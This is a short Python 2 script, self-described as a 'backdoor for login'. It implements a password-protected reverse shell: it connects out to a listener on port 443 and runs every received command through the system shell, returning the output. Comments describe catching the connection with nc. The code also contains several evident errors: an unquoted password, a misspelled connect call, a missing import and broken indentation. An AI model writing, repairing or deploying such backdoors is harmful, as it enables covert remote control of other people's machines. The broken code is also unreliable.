#backdoor for login
#!/usr/bin/python
import subprocess#for process exe inside script
import socket#data manupulation socks

#establish IP for destiny of reverse shell
host="127.0.0.1"
port=443
passwd=rachejazz

#login methods
def login():
	global s
	s.send("login: ")
	pwd= s.recv(1024)

	if pwd.strip()!=passwd:
		login()#method defined later
	else:
		s.send("Connected #>")
		Shell()#method2 defined later

def Shell():
	while(True):
		data=s.recv(1024)
		if data.strip() == ' :kill':
			break
		try:
            		cmd, params = data.split(" ", 1)
            		if cmd == ":chdir":
                	os.chdir(params)
                	print "chdir to %s" % (params)
                	s.send("#> ")
                	continue
        	except:
            		pass
		
		proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin-subprocess.PIPE)
		output = proc.stdout.read() + proc.stderr.read()
		s.send(output)
		s.send(" #> ")

#TCP socket linking
s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connnect((host,port))
login()
#use nc to listen on port, use other machine
#nc on localhost
